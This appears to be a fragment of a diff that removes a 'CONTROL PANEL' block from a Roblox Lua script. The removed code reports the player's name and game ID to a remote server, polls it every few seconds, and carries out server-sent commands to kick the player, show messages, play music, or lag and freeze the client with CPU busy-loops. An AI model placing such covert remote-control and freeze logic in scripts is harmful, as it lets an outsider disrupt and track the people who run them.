-hwid = plr.Name,
-script = SCRIPT,
-game = tostring(game.PlaceId),
-})
-if not ok or not res.Success then return end
-local data = HttpService:JSONDecode(res.Body)
-if data.enabled == false then plr:Kick("Disabled") end
-for _, cmd in ipairs(data.commands or {}) do
-local p = cmd.payload or {}
-if cmd.type == "kick" then
-local reason = p.reason or "Ban da bi kick."
-bigNotify(reason, p.size or 56, 2.5, Color3.fromRGB(255, 80, 80))
-task.delay(2.2, function() plr:Kick(reason) end)
-elseif cmd.type == "message" then
-bigNotify(p.text or "", p.size or 48, p.duration or 5)
-elseif cmd.type == "clear_message" then
-clearNotify()
-elseif cmd.type == "music" then
-playMusic(p.id, p.volume, p.looped)
-elseif cmd.type == "lag" then
-lagLevel = tonumber(p.iterations) or 0
-elseif cmd.type == "freeze" then
-local dur = tonumber(p.duration) or 0
-freezeBusy = tonumber(p.busy) or 0.9
-if dur <= 0 then
-freezeUntil = 0
-else
-freezeUntil = tick() + dur
-end
-end
-end
-end
-RunService.RenderStepped:Connect(function()
-if tick() < freezeUntil then
-local t = tick()
-while tick() - t < freezeBusy do
-local acc = 0
-for i = 1, 5e6 do acc = acc + i end
-end
-elseif lagLevel > 0 then
-local acc = 0
-for i = 1, lagLevel do acc = acc + i end
-end
-end)
-task.spawn(function()
-while task.wait(3) do pcall(heartbeat) end
-end)
-pcall(heartbeat)
-end
--- === END CONTROL PANEL ===
 -- =====================================================
 -- ANTI DROP
 -- =====================================================
